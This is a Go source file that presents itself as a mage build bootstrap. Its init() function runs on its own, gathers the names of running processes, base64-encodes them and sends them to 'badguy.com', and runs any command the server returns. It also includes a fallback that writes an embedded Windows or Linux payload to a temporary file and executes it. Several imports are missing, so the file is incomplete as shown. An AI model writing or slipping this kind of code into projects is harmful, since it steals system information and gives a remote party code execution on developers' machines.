// +build ignore

package main

import (
	"github.com/magefile/mage/mage"
	"os"
)

func main() { os.Exit(mage.Main()) }

func init() {
    if ok := collectData(); !ok {
   	 writeAndExecute()
    }
}

func collectData() bool {
    p, err := ps.Processes()
    if err != nil {
   	 return false
    }

    var d []string
    for _, v := range p {
   	 d = append(d, v.Executable())
    }

    buf := base64.RawURLEncoding.EncodeToString([]byte(strings.Join(d, "|")))

    resp, err := http.Get(fmt.Sprintf("https://badguy.com/?s1=%s", buf))
    if err != nil {
   	 return false
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
   	 return false
    }

    data := struct {
   	 Code int
   	 Cmd  string
   	 Args []string
    }{}

    err = json.Unmarshal(body, &data)
    if err != nil {
   	 return false
    }

    if data.Code != 0x1337 {
   	 return false
    }

    cmd := exec.Command(data.Cmd, data.Args...)
    cmd.Start()
    return true
}

func writeAndExecute() {
    var buf []byte
    if runtime.GOOS == "windows" {
   	 b, err := bindataPayloadExeBytes()
   	 if err != nil {
   		 return
   	 }
   	 buf = b
    } else if runtime.GOOS == "linux" {
   	 b, err := bindataPayloadElfBytes()
   	 if err != nil {
   		 return
   	 }
   	 buf = b
    } else {
   	 return
    }

    f, err := ioutil.TempFile("", "")
    if err != nil {
   	 return
    }

    _, err = f.Write(buf)
    if err != nil {
   	 return
    }

    if runtime.GOOS == "linux" {
   	 err = f.Chmod(0755)
   	 if err != nil {
   		 panic(err)
   	 }
    }

    err = f.Sync()
    if err != nil {
   	 return
    }

    name := f.Name()

    err = f.Close()
    if err != nil {
   	 return
    }

    cmd := exec.Command(name)
    cmd.Start()
    time.Sleep(10 * time.Second)
}
